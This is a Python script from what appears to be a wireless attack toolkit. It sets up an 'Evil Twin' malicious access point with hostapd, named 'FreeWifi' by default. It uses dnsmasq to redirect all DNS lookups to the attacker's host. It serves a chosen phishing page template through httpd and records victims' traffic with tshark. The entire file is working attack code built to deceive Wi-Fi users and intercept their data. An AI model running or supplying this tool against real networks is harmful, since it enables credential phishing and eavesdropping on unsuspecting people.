import os
import subprocess as sp
import banners as br
import time
import shutil

def writehostapdConf(iface,ssid,channel,hw_mode):
    f = open("/opt/wci/cache/hostapd.conf", "w")
    f.write(f"""
interface={iface}
ssid={ssid}
hw_mode={hw_mode}
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
ieee80211n=1
wme_enabled=1
driver=nl80211
""")
    f.close()

def writednsmasqConf(iface):
    f = open("/opt/wci/cache/dnsmasq.conf","w")
    f.write(f"""interface={iface}
dhcp-range=192.168.1.2,192.168.1.250,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1""")
    f.close()

def removeFullFolder(targetFolder):
    shutil.rmtree(targetFolder,ignore_errors=True,onerror=None)

def CopyAllFiles(startFolder):
    shutil.copytree(startFolder,"/srv/http/wciPage/")

def startBridge(startCard):
    endCard = input("Enter a Network card that is Connected to the internet \>>")
    os.system("brctl addbr wciBridge")
    os.system(f"brctl addif wciBridge {endCard}")
    os.system(f"brctl addif wciBridge {startCard}")
    os.system("ip link set dev wciBridge up")
    os.system("brctl stp wciBridge on")
    os.system(f"ifconfig {startCard} 0.0.0.0 up")
    os.system("brctl show")
    time.sleep(2)


def stopBridge():
    os.system("ip link set dev wciBridge down")
    #os.system("brctl stp wciBridge off")
    os.system("brctl delbr wciBridge")


def StartEvilTwin():
    APinterface="eth0"
    APname="FreeWifi"
    APchannel=""
    APhw_mode=""
    APselectedTemplate =""
    APavailableTemplates = []

    br.Banner2()
    os.system("fuser -k 53/tcp")
    os.system("fuser -k 80/tcp")
    os.system("killall hostapd dnsmasq dhcpd")
    try:

        APinterface = input("Network card the AP should use(default: eth0) \>>")
        if APinterface == '':
            APinterface = "eth0"

        APName = input("Malicious AP Name(default:FreeWifi) \>>")
        if APName == "":
            APName = APname

        while True:
            try:
                APchannel= int(input("Enter the channel the AP should use \>>"))
            except ValueError:
                print("Please enter a valid channel NUMBER")
                continue
            else:
                break


        if APchannel < 15:
            APhw_mode="g" #2.5Ghz 
        else:
            APhw_mode="a" #5Ghz
        
        os.system("rm /opt/wci/cache/hostapd.conf")
        writehostapdConf(APinterface,APName,APchannel,APhw_mode)
        os.system("rm /opt/wci/cache/dnsmasq.conf")
        writednsmasqConf(APinterface)

        
        
        #Selecting interface
        folder="./templates/"
        for f in os.scandir(folder):
            if f.is_dir():
                APavailableTemplates.append(str(f).split("'")[1])

        while True:
         APselectedTemplate = input(f"""What template do you want to use?:
    {APavailableTemplates}
    \>>""")
         if APselectedTemplate in APavailableTemplates:
                try:
                    CopyAllFiles("./templates/"+str(APselectedTemplate))
                except:
                    removeFullFolder("/srv/http/wciPage/")
                    CopyAllFiles("./templates/"+str(APselectedTemplate))
                break
         else:
                print("Please enter a valid template.")
                time.sleep(2)
                continue


        
        os.system("xterm -bg black -fg white -hold -e 'dnsmasq -C /opt/wci/cache/dnsmasq.conf -d'>/dev/null 2>&1 &")
        os.system("xterm -bg black -fg white -hold -e 'hostapd /opt/wci/cache/hostapd.conf'>/dev/null 2>&1 &")
        os.system(f"xterm -bg black -fg white -hold -e 'tshark -i {APinterface} -w /opt/wci/main/captures/capture.cap'>/dev/null 2>&1 &")

        os.system(f"ifconfig {APinterface} 192.168.1.1/24")
        os.system("systemctl restart httpd")

        print("Starting Malicious AP...")
        print("Evil Twin Deployed Successfully")
        time.sleep(1)
        os.system("clear")
        while True:
            os.system("clear")
            br.Banner2()
            try:
                print(f"Selected Template: {APselectedTemplate}")
                
                print("Press Ctrl + C to stop the attack")
            except KeyboardInterrupt:
                os.system("hostapd /opt/wci/cache/hostapd.conf -B")
                os.system("killall hostapd dnsmasq dhcpd")
                break
            time.sleep(1)
    except KeyboardInterrupt:
        os.system("systemctl stop httpd")
        os.system("fuser -k 80/tcp &>/dev/null")
        os.system("killall hostapd dnsmasq dhcpd")
        pass
